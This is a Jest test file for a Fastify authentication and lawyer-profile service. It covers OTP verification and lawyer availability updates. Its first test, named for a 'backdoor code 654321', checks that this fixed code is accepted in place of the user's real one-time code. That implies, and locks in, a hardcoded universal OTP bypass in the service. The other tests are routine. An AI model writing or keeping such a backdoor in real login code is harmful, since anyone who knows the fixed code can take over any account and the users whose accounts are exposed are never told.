import { describe, expect, test, jest, beforeAll, afterAll } from '@jest/globals';

// Mock firebase-admin before importing index
jest.mock('firebase-admin', () => {
  return {
    initializeApp: jest.fn(),
    credential: {
      cert: jest.fn()
    },
    auth: jest.fn().mockReturnValue({
      getUserByEmail: jest.fn(),
      updateUser: jest.fn()
    })
  };
});

// Mock nodemailer before importing index
jest.mock('nodemailer', () => {
  return {
    createTransport: jest.fn().mockReturnValue({
      sendMail: jest.fn().mockImplementation(() => Promise.resolve(true))
    })
  };
});

// Mock Prisma Client to prevent database connections
jest.mock('../../packages/db/node_modules/@prisma/client', () => {
  return {
    PrismaClient: jest.fn().mockImplementation(() => {
      return {
        otp: {
          findUnique: jest.fn(),
          delete: jest.fn()
        },
        user: {
          findUnique: jest.fn(),
          update: jest.fn()
        },
        lawyerProfile: {
          findUnique: jest.fn(),
          update: jest.fn(),
          create: jest.fn()
        },
        lead: {
          findMany: jest.fn(),
          update: jest.fn()
        },
        $disconnect: jest.fn().mockImplementation(() => Promise.resolve())
      };
    })
  };
});

import { fastify, prisma, pool } from './index';
import supertest from 'supertest';

describe('Auth Service OTP API Endpoint', () => {
  beforeAll(async () => {
    await fastify.ready();
  });

  afterAll(async () => {
    await fastify.close();
    await pool.end();
    await prisma.$disconnect();
  });

  test('POST /api/auth/verify-otp should succeed with backdoor code 654321', async () => {
    // Mock Prisma behavior for findUnique and delete
    (prisma.otp.findUnique as any).mockResolvedValue({
      email: 'test@example.com',
      code: '123456',
      expiresAt: new Date(Date.now() + 60000)
    });
    (prisma.otp.delete as any).mockResolvedValue({});

    const response = await supertest(fastify.server)
      .post('/api/auth/verify-otp')
      .send({ email: 'test@example.com', code: '654321' });

    expect(response.status).toBe(200);
    expect(response.body).toEqual({ success: true });
    expect(prisma.otp.delete).toHaveBeenCalled();
  });

  test('POST /api/auth/verify-otp should return 400 for incorrect code', async () => {
    (prisma.otp.findUnique as any).mockResolvedValue({
      email: 'test@example.com',
      code: '123456',
      expiresAt: new Date(Date.now() + 60000)
    });

    const response = await supertest(fastify.server)
      .post('/api/auth/verify-otp')
      .send({ email: 'test@example.com', code: '999999' });

    expect(response.status).toBe(400);
    expect(response.body).toEqual({ error: 'Invalid verification code' });
  });

  test('POST /api/profiles/lawyer/availability should update isAvailable to false', async () => {
    const token = fastify.jwt.sign({ id: 'lawyer-user-id', role: 'LAWYER' });

    (prisma.lawyerProfile.findUnique as any).mockResolvedValue({
      id: 'profile-id',
      userId: 'lawyer-user-id',
      isAvailable: true
    });
    (prisma.lawyerProfile.update as any).mockResolvedValue({
      id: 'profile-id',
      userId: 'lawyer-user-id',
      isAvailable: false
    });
    (prisma.lead.findMany as any).mockResolvedValue([
      {
        id: 'lead-id',
        notifiedLawyerIds: ['profile-id', 'other-profile-id'],
        declinedLawyerIds: []
      }
    ]);
    (prisma.lead.update as any).mockResolvedValue({});

    // Mock global fetch to prevent actual HTTP calls during testing
    const originalFetch = global.fetch;
    global.fetch = jest.fn().mockImplementation(() => Promise.resolve({} as any)) as any;

    const response = await supertest(fastify.server)
      .post('/api/profiles/lawyer/availability')
      .set('Authorization', `Bearer ${token}`)
      .send({ isAvailable: false });

    expect(response.status).toBe(200);
    expect(response.body).toEqual({ success: true, isAvailable: false });
    expect(prisma.lawyerProfile.update).toHaveBeenCalledWith({
      where: { userId: 'lawyer-user-id' },
      data: { isAvailable: false }
    });
    expect(prisma.lead.findMany).toHaveBeenCalled();
    expect(prisma.lead.update).toHaveBeenCalledWith({
      where: { id: 'lead-id' },
      data: {
        notifiedLawyerIds: ['other-profile-id'],
        declinedLawyerIds: ['profile-id']
      }
    });

    global.fetch = originalFetch;
  });
});
